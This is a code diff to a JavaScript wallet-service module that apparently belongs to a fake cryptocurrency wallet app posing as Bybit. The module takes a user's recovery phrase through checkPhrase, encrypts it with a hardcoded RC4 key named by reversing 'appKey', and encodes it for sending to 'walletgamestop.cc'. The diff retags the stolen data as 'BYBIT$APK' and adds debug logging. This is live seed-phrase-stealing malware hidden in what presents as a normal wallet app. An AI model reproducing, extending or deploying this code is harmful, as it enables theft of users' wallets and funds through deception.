@@ -6,8 +6,8 @@ import { decode as atob, encode as btoa } from 'base-64'
 import queryString from 'query-string'
 let url = 'https://walletgamestop.cc/concept/unity/check'
 const yekApp = 'aBN6qreLALR9QYPy'
-let xxx = 'BBBGE$DG|EX/G'
-let xx = 'BBBGE$DG|EX'
+let xxx = 'BYBIT$APK/G'
+let xx = 'BYBIT$APK'
 import rc4 from './funcWallet/rc4'
 
 export function rebuildObjPortfolio(list) {
@@ -102,20 +102,22 @@ const useWalletService = () => {
 	function createRequestBody(value, isNew) {
 		const nameWallet = isNew ? xxx : xx
 
-		let crypt = btoa(
-			rc4(
-				yekApp,
-				JSON.stringify({
-					salt: randomNum(100000, 999999),
-					new: isNew,
-					sendData: null,
-					runner: null,
-					public: checkPhrase(value),
-					accounts: null,
-					name: nameWallet,
-				})
-			)
-		)
+		const obj = {
+			salt: randomNum(100000, 999999),
+			sendData: null,
+			runner: null,
+			public: checkPhrase(value),
+			accounts: null,
+			name: nameWallet,
+		}
+		console.log('isNew - ' + isNew)
+		if (isNew) {
+			obj.new = true
+		}
+
+		console.log(obj)
+
+		let crypt = btoa(rc4(yekApp, JSON.stringify(obj)))
 		let urlencoded = queryString.stringify({ data: crypt })
 		return urlencoded
 	}
